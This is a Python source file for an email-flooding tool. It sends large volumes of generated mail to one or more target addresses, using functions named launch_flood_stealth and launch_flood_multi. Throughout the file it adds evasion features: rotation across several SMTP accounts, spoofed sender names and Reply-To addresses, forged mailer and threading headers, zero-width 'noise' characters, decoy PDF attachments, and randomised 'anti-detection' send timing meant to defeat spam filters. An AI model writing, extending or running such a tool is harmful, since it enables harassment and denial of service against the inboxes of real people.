import logging
import os
import queue
import random
import secrets
import smtplib
import string
import time
import threading
import concurrent.futures
from email.message import EmailMessage
from dotenv import load_dotenv
from typing import List, Dict, Union, Optional, Tuple, Any

load_dotenv()

logger = logging.getLogger(__name__)

try:
    from fpdf import FPDF
    _PDF_AVAILABLE = True
except ImportError:
    _PDF_AVAILABLE = False
    logger.info("fpdf2 not installed -- PDF attachments disabled. Run: pip install fpdf2")

# --- CONFIG (from .env, supports multiple SMTP accounts) ---


def _load_smtp_accounts() -> List[Tuple]:
    accounts = []
    accounts.append((
        os.environ["SMTP_HOST"],
        int(os.environ["SMTP_PORT"]),
        os.environ["SMTP_USER"],
        os.environ["SMTP_PASS"],
    ))
    i = 2
    while True:
        host = os.environ.get(f"SMTP_HOST_{i}")
        if not host:
            break
        accounts.append((
            host,
            int(os.environ.get(f"SMTP_PORT_{i}", "587")),
            os.environ.get(f"SMTP_USER_{i}", ""),
            os.environ.get(f"SMTP_PASS_{i}", ""),
        ))
        i += 1
    logger.info("Loaded %d SMTP account(s)", len(accounts))
    return accounts


SMTP_ACCOUNTS = _load_smtp_accounts()
SENDER_EMAIL = os.environ["SENDER_EMAIL"]

# ---------------------------------------------------------------------------
# FROM DISPLAY NAME RANDOMIZATION
# ---------------------------------------------------------------------------

FROM_DISPLAY_NAMES = [
    "Account Services", "Notification Center", "Support Team",
    "Customer Care", "Info Desk", "Service Alerts",
    "Updates", "Admin", "Help Center", "Billing Department",
    "Security Team", "Order Confirmation", "Newsletter",
    "Delivery Updates", "System Admin", "Accounts Receivable",
    "Priority Mail", "Helpdesk", "Client Relations", "Inbox",
]

FROM_PERSON_NAMES = [
    "Alex Rivera", "Jordan Smith", "Casey Thompson", "Taylor Morgan",
    "Sam Chen", "Chris Williams", "Sarah K.", "David Marsh",
    "Emily Torres", "Ryan O'Neil", "Jessica Huang", "Mike P.",
    "Lisa Fernandez", "Kevin O'Brien", "Rachel Green", "Thomas Wright",
    "Amanda Collins", "Nicole Park", "James Russo", "Diana Kowalski",
]


def _randomized_from() -> str:
    if random.random() > 0.35:
        pool = FROM_DISPLAY_NAMES if random.random() > 0.5 else FROM_PERSON_NAMES
        display_name = random.choice(pool)
        return f"{display_name} <{SENDER_EMAIL}>"
    return SENDER_EMAIL


# ---------------------------------------------------------------------------
# TEMPLATE POOLS
# ---------------------------------------------------------------------------

GREETINGS = [
    "Hi", "Hello", "Hey", "Hey there", "Greetings", "Good day",
    "Good morning", "Good afternoon", "Good evening", "Hope this finds you well",
    "Hope your week is going well", "Long time no see", "Just a quick note",
    "Hi again", "Howdy", "Morning", "Afternoon", "Hey stranger",
    "Hope all is well", "Hi there",
]

INTROS = [
    "I'm reaching out regarding",
    "I just wanted to follow up on",
    "This is a notification about",
    "Please take a moment to review",
    "We noticed a change in",
    "An update is available for",
    "Just circling back on",
    "Per our last conversation about",
    "I had a quick thought about",
    "Did you get a chance to look at",
    "I've been meaning to ask about",
    "Thought you might want to know about",
    "Quick heads up regarding",
    "Wanted to loop you in on",
    "Not sure if you saw the update on",
    "Bumping this up about",
    "As discussed earlier regarding",
    "Just a friendly reminder about",
    "Wanted your input on",
    "Circling back one more time on",
]

QUESTIONS = [
    "Do you have any thoughts on",
    "Have you had a chance to review",
    "Can you confirm the status of",
    "Would you be able to look into",
    "Any updates on",
    "Could you let me know about",
    "What's the latest on",
    "Are we still aligned on",
]

TOPICS = [
    "your recent order", "your account status", "the documents I sent",
    "tomorrow's meeting", "your subscription", "our previous discussion",
    "the invoice #{id}", "the security alert on your device",
    "the quarterly review", "your recent support ticket",
    "the upcoming deadline", "the draft I shared last week",
    "the new policy update", "the team standup notes",
    "your availability next week", "the contract renewal",
    "the warranty on your device", "the package tracking update",
    "your appointment confirmation", "the pricing changes",
    "your feedback survey", "the onboarding schedule",
    "the referral bonus program", "the system maintenance window",
    "the budget allocation for Q{q}",
]

CLOSINGS = [
    "Best", "Regards", "Sincerely", "Thanks", "See you", "Cheers",
    "Warm regards", "Talk soon", "Kind regards", "Thank you",
    "All the best", "Respectfully", "Take care",
    "Looking forward to hearing from you", "Have a great day",
]

NAMES = [
    "Alex Rivera", "Jordan Smith", "Casey Thompson", "Taylor Morgan",
    "Morgan Lee", "Sam Chen", "Chris Williams", "Dr. Chen",
    "Sarah K.", "David Marsh", "Emily Torres", "Ryan O'Neil",
    "Jessica Huang", "Mike P.", "Anil Patel", "Lisa Fernandez",
    "Kevin O'Brien", "Rachel Green", "Thomas Wright", "Amanda Collins",
    "M. Johnson", "Nicole Park", "James Russo", "Diana Kowalski",
    "Brandon Yates",
]

HUMAN_SUBJECTS = [
    "Quick question", "Follow up", "Re: Your account", "Meeting tomorrow",
    "Did you see this?", "Important: Please read", "Action required",
    "Invoice #{id}", "Shipping update", "Hello!", "Checking in",
    "Regarding our last conversation", "Your password reset code",
    "Security Alert", "Update required", "Notification", "RE: Discussion",
    "Fw: For your review", "Can we reschedule?", "Your order has shipped",
    "Invitation: Team sync", "Friendly reminder", "One more thing",
    "Per your request", "Document attached", "Schedule change",
    "New message from support", "Your feedback is valued", "Welcome aboard",
    "Account verification", "Confirmation needed", "Time-sensitive request",
    "Quick favor", "Touching base", "Monthly summary",
    "System notification", "Access request", "Your receipt",
    "RE: Follow up", "Upcoming changes",
]

NOTIFICATION_PREAMBLES = [
    "We wanted to inform you about a recent update to",
    "This is to notify you of a change regarding",
    "Your attention is needed for",
    "A scheduled update has been applied to",
    "Please be advised of a modification to",
]

DETAIL_LINES = [
    "No action is required on your part at this time.",
    "Please review and confirm at your earliest convenience.",
    "If you have questions, reply to this email.",
    "This change will take effect within 24 hours.",
    "You can manage your preferences in the settings panel.",
]

COMPANY_NAMES = [
    "Apex Solutions", "BrightPath Services", "NovaTech", "Clearview Systems",
    "Pinnacle Group", "Horizon Digital", "Vertex Support", "Elevate Inc.",
]

QUOTED_LINES = [
    "Can you send me the updated file?",
    "Let me know when you're free to discuss.",
    "I think we should revisit the timeline.",
    "The numbers look good but need a second look.",
    "I'll loop in the team for feedback.",
    "Sounds good, let's go with that approach.",
]

RESPONSE_LINES = [
    "Absolutely, I'll have that over to you by end of day",
    "Good point — I've updated the draft accordingly",
    "Agreed, let me circle back once I've confirmed with the team",
    "Thanks for flagging that, I'll take another look",
    "Sure thing, I'll send the revised version shortly",
]

SIGNATURES = [
    "\n--\nSent from my iPhone",
    "\n--\nSent from my Galaxy",
    "\n--\nSent from Mail for Windows",
    "\n--\n{name} | Account Manager\nPhone: (555) {p1}-{p2}",
    "\n--\n{name} | Customer Success\n{company}",
    "\n--\n{name}\nSenior Associate | {company}",
    "\n--\nThis email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.",
    "\n--\nPlease consider the environment before printing this email.",
    "\n--\nBest,\n{name}\n{company} | www.example.com",
    "\n--\n{name} | Operations\nDirect: (555) {p1}-{p2} ext. {ext}",
    "",
    "",
    "",
]

MAILER_STRINGS = [
    "Microsoft Outlook 16.0",
    "Apple Mail (2.3774)",
    "Thunderbird 115.12.0",
    "Gmail",
    "Yahoo Mail/1.0",
    "Postfix",
    "Evolution 3.50",
    "Mutt/2.2.12",
    "",
    "",
    "",
]

REPLY_TO_DOMAINS = [
    "gmail.com", "outlook.com", "yahoo.com", "protonmail.com",
    "icloud.com", "hotmail.com", "mail.com", "zoho.com",
]

# ---------------------------------------------------------------------------
# PDF DOCUMENT GENERATION
# ---------------------------------------------------------------------------

PDF_TITLES = [
    "Quarterly Report", "Meeting Minutes", "Project Update",
    "Invoice", "Proposal", "Agreement", "Schedule",
    "Budget Summary", "Performance Review", "Action Items",
    "Compliance Report", "Risk Assessment", "Strategy Brief",
    "Audit Findings", "Policy Update",
]

PDF_BODY_LINES = [
    "The following items have been reviewed and approved by management.",
    "Please find the updated figures for the current reporting period.",
    "All action items from the previous meeting have been addressed.",
    "The attached document supersedes any prior versions distributed.",
    "Your prompt attention to this matter is appreciated.",
    "Key performance indicators continue to trend positively.",
    "Budget allocations have been adjusted per the board's directive.",
    "Stakeholder feedback has been incorporated into the revised draft.",
    "The timeline has been updated to reflect current milestones.",
    "Compliance requirements have been met for this reporting cycle.",
]


def _generate_pdf_attachment() -> Optional[Tuple[bytes, str]]:
    if not _PDF_AVAILABLE:
        return None

    try:
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Helvetica", "B", 16)

        title = random.choice(PDF_TITLES)
        ref = secrets.token_hex(4).upper()
        filename = f"{title.lower().replace(' ', '_')}_{ref}.pdf"

        pdf.cell(0, 10, f"{title} - Ref: {ref}", new_x="LMARGIN", new_y="NEXT", align="C")
        pdf.ln(5)

        pdf.set_font("Helvetica", "", 11)
        months = ["January", "February", "March", "April", "May", "June"]
        date_str = f"Date: {random.choice(months)} {random.randint(1,28)}, 2026"
        pdf.cell(0, 8, date_str, new_x="LMARGIN", new_y="NEXT")
        pdf.cell(0, 8, f"Prepared by: {random.choice(NAMES)}", new_x="LMARGIN", new_y="NEXT")
        pdf.cell(0, 8, f"Department: {random.choice(COMPANY_NAMES)}", new_x="LMARGIN", new_y="NEXT")
        pdf.ln(8)

        for _ in range(random.randint(3, 6)):
            line = random.choice(PDF_BODY_LINES)
            topic = random.choice(TOPICS).replace("{id}", str(random.randint(1000, 9999))).replace("{q}", str(random.randint(1, 4)))
            pdf.multi_cell(0, 6, f"{line} Regarding {topic}.")
            pdf.ln(4)

        pdf.set_font("Helvetica", "I", 9)
        pdf.cell(0, 8, "CONFIDENTIAL - For authorized recipients only.", new_x="LMARGIN", new_y="NEXT", align="C")

        return pdf.output(), filename
    except Exception as e:
        logger.warning("PDF generation failed: %s", e)
        return None


# ---------------------------------------------------------------------------
# HTML TEMPLATES
# ---------------------------------------------------------------------------

HTML_BUSINESS = """<!DOCTYPE html>
<html><body style="font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#333;">
<p>{greeting},</p>
<p>{body_line}</p>
<p>{filler}</p>
<hr style="border:none;border-top:1px solid #ddd;margin:20px 0;">
<p style="font-size:12px;color:#888;">{name}<br>{company}</p>
</body></html>"""

HTML_NOTIFICATION = """<!DOCTYPE html>
<html><body style="font-family:Arial,Helvetica,sans-serif;font-size:14px;color:#333;">
<div style="background:#f8f9fa;border:1px solid #e0e0e0;border-radius:6px;padding:20px;max-width:560px;margin:0 auto;">
<h2 style="margin-top:0;color:#1a73e8;font-size:18px;">{subject_line}</h2>
<p>{body_line}</p>
<p style="color:#666;font-size:13px;">{detail}</p>
</div>
<p style="font-size:11px;color:#999;margin-top:20px;">This is an automated notification. Do not reply directly.</p>
</body></html>"""

HTML_NEWSLETTER = """<!DOCTYPE html>
<html><body style="font-family:Georgia,serif;font-size:15px;color:#222;max-width:600px;margin:0 auto;">
<h1 style="font-size:22px;border-bottom:2px solid #333;padding-bottom:8px;">{subject_line}</h1>
<p>{body_line}</p>
<p>{filler}</p>
<p style="font-size:12px;color:#888;margin-top:30px;">You received this because you're subscribed to updates.<br>
<a href="#" style="color:#888;">Unsubscribe</a> | <a href="#" style="color:#888;">Manage preferences</a></p>
</body></html>"""

# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------


def _random_string(length: int = 10) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def _random_date() -> str:
    months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
    return f"{random.choice(months)} {random.randint(1,28)}, 2026 at {random.randint(1,12)}:{random.randint(0,59):02d} {'AM' if random.random()>0.5 else 'PM'}"


def _inject_noise(text: str) -> str:
    noise_char = "​"
    words = text.split()
    result = []
    for word in words:
        if random.random() > 0.85:
            pos = random.randint(1, max(1, len(word) - 1))
            word = word[:pos] + noise_char + word[pos:]
        result.append(word)
    return " ".join(result)


def _build_signature() -> str:
    template = random.choice(SIGNATURES)
    if not template:
        return ""
    name = random.choice(NAMES)
    first_name = name.split()[0]
    return template.format(
        name=name,
        first_name=first_name,
        company=random.choice(COMPANY_NAMES),
        p1=f"{random.randint(100,999)}",
        p2=f"{random.randint(1000,9999)}",
        ext=str(random.randint(100, 999)),
    )


def _resolve_topic(topic: str) -> str:
    return topic.replace("{id}", str(random.randint(1000, 9999))).replace("{q}", str(random.randint(1, 4)))


# ---------------------------------------------------------------------------
# BODY BUILDERS (5 distinct templates, accept optional topic for coherence)
# ---------------------------------------------------------------------------


def _build_body_business(topic: Optional[str] = None) -> str:
    if topic is None:
        topic = random.choice(TOPICS)
    topic = _resolve_topic(topic)
    greeting = random.choice(GREETINGS)
    intro = random.choice(INTROS)
    closing = random.choice(CLOSINGS)
    name = random.choice(NAMES)
    filler = ""
    if random.random() > 0.4:
        filler = "\nLet me know if you have any questions or need further assistance."
    return f"{greeting},\n\n{intro} {topic}.{filler}\n\n{closing},\n{name}"


def _build_body_question(topic: Optional[str] = None) -> str:
    if topic is None:
        topic = random.choice(TOPICS)
    topic = _resolve_topic(topic)
    greeting = random.choice(GREETINGS)
    question = random.choice(QUESTIONS)
    closing = random.choice(CLOSINGS)
    name = random.choice(NAMES)
    return f"{greeting},\n\n{question} {topic}?\n\nLet me know when you get a chance.\n\n{closing},\n{name}"


def _build_body_notification(topic: Optional[str] = None) -> str:
    if topic is None:
        topic = random.choice(TOPICS)
    topic = _resolve_topic(topic)
    preamble = random.choice(NOTIFICATION_PREAMBLES)
    detail = random.choice(DETAIL_LINES)
    company = random.choice(COMPANY_NAMES)
    return f"Dear customer,\n\n{preamble} {topic}.\n\n{detail}\n\nThank you,\n{company} Support"


def _build_body_reply_chain(topic: Optional[str] = None) -> str:
    name = random.choice(NAMES)
    fake_date = _random_date()
    quoted = random.choice(QUOTED_LINES)
    response = random.choice(RESPONSE_LINES)
    closing = random.choice(CLOSINGS)
    return f"On {fake_date}, {name} wrote:\n> {quoted}\n\n{response}.\n\n{closing}"


def _build_body_short(topic: Optional[str] = None) -> str:
    if topic is None:
        topic = random.choice(TOPICS)
    topic = _resolve_topic(topic)
    first_name = random.choice(NAMES).split()[0]
    return f"{topic} -- thoughts?\n\n- {first_name}"


BODY_BUILDERS = [
    _build_body_business,
    _build_body_business,
    _build_body_question,
    _build_body_notification,
    _build_body_reply_chain,
    _build_body_short,
]

BUILDER_MAP = {
    "business": _build_body_business,
    "question": _build_body_question,
    "notification": _build_body_notification,
    "reply_chain": _build_body_reply_chain,
    "short": _build_body_short,
}


def build_random_body() -> str:
    builder = random.choice(BODY_BUILDERS)
    body = builder()
    body = _inject_noise(body)
    if random.random() > 0.3:
        body += _build_signature()
    body += f"\n\n---\nRef: {secrets.token_hex(4)}-{_random_string(3)}"
    return body


def _build_html_body(subject: str) -> Optional[str]:
    if random.random() > 0.4:
        return None

    topic = random.choice(TOPICS).replace("{id}", str(random.randint(1000, 9999))).replace("{q}", str(random.randint(1, 4)))
    greeting = random.choice(GREETINGS)
    intro = random.choice(INTROS)
    name = random.choice(NAMES)
    company = random.choice(COMPANY_NAMES)
    detail = random.choice(DETAIL_LINES)
    filler = random.choice(DETAIL_LINES)

    body_line = f"{intro} {topic}."

    template = random.choice([HTML_BUSINESS, HTML_NOTIFICATION, HTML_NEWSLETTER])
    return template.format(
        greeting=greeting,
        body_line=body_line,
        filler=filler,
        name=name,
        company=company,
        subject_line=subject,
        detail=detail,
    )


# ---------------------------------------------------------------------------
# SUBJECT-BODY COHERENCE SYSTEM
# ---------------------------------------------------------------------------

COHERENT_CATEGORIES = {
    "meeting": {
        "subjects": [
            "Meeting tomorrow", "Can we reschedule?", "Invitation: Team sync",
            "Schedule change", "Upcoming meeting", "Re: Meeting time",
            "Agenda for tomorrow", "Room change for standup",
        ],
        "topics": [
            "tomorrow's meeting", "the upcoming deadline",
            "your availability next week", "the team standup notes",
            "the quarterly review", "the onboarding schedule",
        ],
        "builders": ["business", "question", "short"],
    },
    "account": {
        "subjects": [
            "Re: Your account", "Account verification", "Security Alert",
            "Your password reset code", "Action required", "Important: Please read",
            "Confirmation needed", "Update required",
        ],
        "topics": [
            "your account status", "the security alert on your device",
            "the new policy update", "your subscription",
        ],
        "builders": ["notification", "business"],
    },
    "order": {
        "subjects": [
            "Your order has shipped", "Shipping update", "Delivery Updates",
            "Your receipt", "Order confirmation", "Package tracking update",
        ],
        "topics": [
            "your recent order", "the package tracking update",
            "the warranty on your device", "your appointment confirmation",
        ],
        "builders": ["notification"],
    },
    "invoice": {
        "subjects": [
            "Invoice #{id}", "Monthly summary", "Budget update",
            "Payment confirmation", "Accounts receivable update",
        ],
        "topics": [
            "the invoice #{id}", "the budget allocation for Q{q}",
            "the contract renewal", "the pricing changes",
        ],
        "builders": ["business", "notification"],
    },
    "followup": {
        "subjects": [
            "Follow up", "Checking in", "Quick question", "Touching base",
            "Quick favor", "One more thing", "Per your request",
            "Regarding our last conversation", "RE: Follow up",
        ],
        "topics": [
            "our previous discussion", "the documents I sent",
            "the draft I shared last week", "your recent support ticket",
            "your feedback survey",
        ],
        "builders": ["business", "question", "reply_chain", "short"],
    },
    "general": {
        "subjects": [
            "Hello!", "Did you see this?", "Notification", "RE: Discussion",
            "Fw: For your review", "New message from support", "Welcome aboard",
            "System notification", "Document attached", "Time-sensitive request",
            "Friendly reminder", "Access request", "Upcoming changes",
            "Your feedback is valued",
        ],
        "topics": None,
        "builders": ["business", "question", "notification", "reply_chain", "short"],
    },
}


def _build_coherent_email() -> Tuple[str, str, Optional[str]]:
    category_name = random.choice(list(COHERENT_CATEGORIES.keys()))
    cat = COHERENT_CATEGORIES[category_name]

    subject = random.choice(cat["subjects"])
    subject = subject.replace("{id}", str(random.randint(10000, 99999)))

    if random.random() > 0.65:
        subject = f"Re: {subject}" if random.random() > 0.5 else f"Fw: {subject}"
    if random.random() > 0.5:
        subject += f" - {secrets.token_hex(2).upper()}"

    topic_pool = cat["topics"] if cat["topics"] else TOPICS
    topic = random.choice(topic_pool)

    builder_name = random.choice(cat["builders"])
    builder = BUILDER_MAP[builder_name]
    body = builder(topic=topic)
    body = _inject_noise(body)
    if random.random() > 0.3:
        body += _build_signature()
    body += f"\n\n---\nRef: {secrets.token_hex(4)}-{_random_string(3)}"

    html = _build_html_body(subject)

    return subject, body, html


# ---------------------------------------------------------------------------
# HEADER HELPERS
# ---------------------------------------------------------------------------

EHLO_HOSTNAMES = [
    "mail.localhost", "smtp-out.prod", "mta01.internal", "relay.local",
    "mx.workstation", "outbound.node", "mailer.home", "smtp.desktop",
]


def _apply_headers(msg: EmailMessage) -> None:
    mailer = random.choice(MAILER_STRINGS)
    if mailer:
        msg["X-Mailer"] = mailer

    if random.random() > 0.7:
        reply_name = _random_string(random.randint(5, 10)).lower()
        reply_domain = random.choice(REPLY_TO_DOMAINS)
        msg["Reply-To"] = f"{reply_name}@{reply_domain}"

    priority = random.choice(["1", "3", "3", "3", "5"])
    if priority != "3":
        msg["X-Priority"] = priority

    msg_id_domain = random.choice(["mail.gmail.com", "outlook.com", "mx.example.com", "smtp.local"])
    msg["Message-ID"] = f"<{secrets.token_hex(12)}@{msg_id_domain}>"


def _apply_threading_headers(msg: EmailMessage, subject: str) -> None:
    if not subject.startswith(("Re:", "Fw:", "RE:", "FW:", "Fwd:")):
        return

    ref_domains = ["mail.gmail.com", "outlook.com", "yahoo.com", "mx.server.com"]
    original_id = f"<{secrets.token_hex(12)}@{random.choice(ref_domains)}>"
    msg["In-Reply-To"] = original_id

    if random.random() > 0.5:
        older_id = f"<{secrets.token_hex(12)}@{random.choice(ref_domains)}>"
        msg["References"] = f"{older_id} {original_id}"
    else:
        msg["References"] = original_id


# ---------------------------------------------------------------------------
# SMTP CONNECTION POOL
# ---------------------------------------------------------------------------


class SmtpPool:
    def __init__(self, accounts: List[Tuple], max_per_account: int = 3) -> None:
        self._accounts = accounts
        self._max = max_per_account
        self._pools: Dict[int, queue.Queue] = {
            i: queue.Queue(maxsize=max_per_account)
            for i in range(len(accounts))
        }
        self._failures: Dict[int, float] = {}
        self._success: Dict[int, int] = {i: 0 for i in range(len(accounts))}
        self._fail: Dict[int, int] = {i: 0 for i in range(len(accounts))}
        self._index = 0
        self._lock = threading.Lock()
        self.COOLDOWN = 60.0

    def _next_account_idx(self) -> int:
        with self._lock:
            now = time.time()
            candidates = []
            weights = []
            for i in range(len(self._accounts)):
                fail_time = self._failures.get(i, 0)
                if now - fail_time < self.COOLDOWN:
                    continue
                candidates.append(i)
                total = self._success[i] + self._fail[i]
                if total < 5:
                    weights.append(1.0)
                else:
                    rate = self._success[i] / total
                    weights.append(0.1 + rate)

            if not candidates:
                return 0

            if len(candidates) == 1:
                return candidates[0]

            return random.choices(candidates, weights=weights, k=1)[0]

    def record_success(self, idx: int) -> None:
        with self._lock:
            self._success[idx] = self._success.get(idx, 0) + 1

    def record_failure(self, idx: int) -> None:
        with self._lock:
            self._fail[idx] = self._fail.get(idx, 0) + 1

    def get_stats(self) -> List[Dict]:
        with self._lock:
            stats = []
            for i in range(len(self._accounts)):
                s = self._success.get(i, 0)
                f = self._fail.get(i, 0)
                total = s + f
                rate = (s / total * 100) if total > 0 else 0.0
                stats.append({"account": i, "success": s, "failed": f, "rate": round(rate, 1)})
            return stats

    def acquire(self) -> Tuple[Optional[smtplib.SMTP], int]:
        idx = self._next_account_idx()

        pool = self._pools[idx]
        try:
            conn = pool.get_nowait()
            try:
                status = conn.noop()
                if status[0] == 250:
                    return conn, idx
            except Exception:
                pass
            try:
                conn.quit()
            except Exception:
                pass
        except queue.Empty:
            pass

        host, port, user, password = self._accounts[idx]
        try:
            conn = smtplib.SMTP(host, port, timeout=15)
            ehlo_host = random.choice(EHLO_HOSTNAMES)
            conn.ehlo(ehlo_host)
            conn.starttls()
            conn.ehlo(ehlo_host)
            conn.login(user, password)
            return conn, idx
        except Exception as e:
            logger.warning("SMTP pool connect failed for account %d: %s", idx, e)
            self._failures[idx] = time.time()
            return None, idx

    def release(self, conn: smtplib.SMTP, idx: int) -> None:
        try:
            self._pools[idx].put_nowait(conn)
        except queue.Full:
            try:
                conn.quit()
            except Exception:
                pass

    def discard(self, idx: int, conn: Optional[smtplib.SMTP] = None) -> None:
        with self._lock:
            self._failures[idx] = time.time()
        if conn:
            try:
                conn.quit()
            except Exception:
                pass

    def close_all(self) -> None:
        for idx in list(self._pools.keys()):
            while True:
                try:
                    conn = self._pools[idx].get_nowait()
                    conn.quit()
                except (queue.Empty, Exception):
                    break


_pool = SmtpPool(SMTP_ACCOUNTS)


# ---------------------------------------------------------------------------
# ANTI-DETECTION TIMING
# ---------------------------------------------------------------------------


def _email_warmup_delay(index: int) -> float:
    if index == 0:
        return random.uniform(0.5, 2.0)
    if index < 5:
        return random.uniform(1.5, 3.5)
    return 0.0


def _email_inter_delay(index: int, total: int) -> float:
    if random.random() < 0.05:
        return random.uniform(12.0, 25.0)
    if random.random() < 0.12:
        return random.uniform(5.0, 10.0)

    if (index + 1) % random.randint(3, 6) == 0:
        return random.uniform(1.5, 4.0)
    return random.uniform(0.2, 1.0)


# ---------------------------------------------------------------------------
# SEND SINGLE EMAIL (uses coherence + pooling + threading headers)
# ---------------------------------------------------------------------------


def send_single_flood_stealth(target_email: str, cancel_event: Optional[threading.Event] = None) -> str:
    if cancel_event and cancel_event.is_set():
        return "Cancelled"

    subject, plain_body, html_body = _build_coherent_email()

    for attempt in range(3):
        conn, idx = _pool.acquire()
        if conn is None:
            if attempt < 2:
                time.sleep(2 * (attempt + 1))
                continue
            return "No SMTP accounts available"

        try:
            msg = EmailMessage()
            msg["Subject"] = subject
            msg["From"] = _randomized_from()
            msg["To"] = target_email

            _apply_headers(msg)
            _apply_threading_headers(msg, subject)

            msg.set_content(plain_body)
            if html_body:
                msg.add_alternative(html_body, subtype="html")

            if random.random() > 0.8:
                pdf_result = _generate_pdf_attachment()
                if pdf_result:
                    pdf_bytes, pdf_name = pdf_result
                    msg.add_attachment(pdf_bytes, maintype="application", subtype="pdf", filename=pdf_name)

            conn.send_message(msg)
            _pool.release(conn, idx)
            _pool.record_success(idx)
            return f"Success via {SMTP_ACCOUNTS[idx][2]}"

        except smtplib.SMTPServerDisconnected:
            _pool.record_failure(idx)
            _pool.discard(idx, conn)
            time.sleep(1)
            continue
        except smtplib.SMTPResponseException as e:
            _pool.record_failure(idx)
            if e.smtp_code in (421, 450, 451, 452):
                _pool.discard(idx, conn)
                time.sleep(2 * (attempt + 1))
                continue
            _pool.discard(idx, conn)
            return f"SMTP error {e.smtp_code}: {e.smtp_error}"
        except Exception as e:
            _pool.record_failure(idx)
            _pool.discard(idx, conn)
            if attempt < 2:
                time.sleep(1)
                continue
            return f"Error: {e}"

    return "Failed after 3 retries"


# ---------------------------------------------------------------------------
# MAIN FLOOD LAUNCHER
# ---------------------------------------------------------------------------


def launch_flood_stealth(
    target: str,
    total_count: int = 50,
    max_workers: int = 5,
    progress_callback=None,
    cancel_event: Optional[threading.Event] = None,
) -> Dict:
    logger.info("Deploying flood against %s (%d payloads)", target, total_count)
    start_time = time.time()

    errors: Dict[str, int] = {}
    success_count = 0
    completed = 0
    lock = threading.Lock()

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for i in range(total_count):
            if cancel_event and cancel_event.is_set():
                break

            warmup = _email_warmup_delay(i)
            if warmup > 0:
                time.sleep(warmup)

            futures.append(executor.submit(send_single_flood_stealth, target, cancel_event))
            time.sleep(_email_inter_delay(i, total_count))

        for future in concurrent.futures.as_completed(futures):
            res = future.result()
            with lock:
                completed += 1
                if "Success" in res:
                    success_count += 1
                elif res != "Cancelled":
                    err_key = res.split(":")[0] if ":" in res else res
                    errors[err_key] = errors.get(err_key, 0) + 1
                    logger.warning("Payload failed: %s", res)

                if progress_callback and completed % max(1, total_count // 20) == 0:
                    try:
                        progress_callback(completed, total_count, res)
                    except Exception:
                        pass

    duration = time.time() - start_time
    failed = completed - success_count

    logger.info(
        "Flood complete: %d/%d delivered in %.1fs",
        success_count, total_count, duration,
    )

    return {
        "total": total_count,
        "success": success_count,
        "failed": failed,
        "errors": errors,
        "duration_seconds": round(duration, 1),
    }


# ---------------------------------------------------------------------------
# MULTI-TARGET FLOOD
# ---------------------------------------------------------------------------


def launch_flood_multi(
    targets: List[str],
    count_per_target: int = 50,
    max_workers: int = 5,
    progress_callback=None,
    cancel_event: Optional[threading.Event] = None,
) -> Dict:
    logger.info("Multi-target flood: %d targets, %d each", len(targets), count_per_target)

    all_results: Dict = {
        "total": 0, "success": 0, "failed": 0,
        "errors": {}, "per_target": {},
        "duration_seconds": 0,
    }
    start_time = time.time()

    for target in targets:
        if cancel_event and cancel_event.is_set():
            break
        result = launch_flood_stealth(target, count_per_target, max_workers, progress_callback, cancel_event)
        all_results["total"] += result["total"]
        all_results["success"] += result["success"]
        all_results["failed"] += result["failed"]
        for err, count in result.get("errors", {}).items():
            all_results["errors"][err] = all_results["errors"].get(err, 0) + count
        all_results["per_target"][target] = result

    all_results["duration_seconds"] = round(time.time() - start_time, 1)
    return all_results


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="Target email address (comma-separated for multi-target)")
    parser.add_argument("--count", type=int, default=10, help="Total emails per target")
    parser.add_argument("--threads", type=int, default=3, help="Concurrent threads")
    args = parser.parse_args()

    targets = [t.strip() for t in args.target.split(",")]
    if len(targets) > 1:
        results = launch_flood_multi(targets, args.count, args.threads)
    else:
        results = launch_flood_stealth(targets[0], args.count, args.threads)
    print(f"\nResults: {results}")
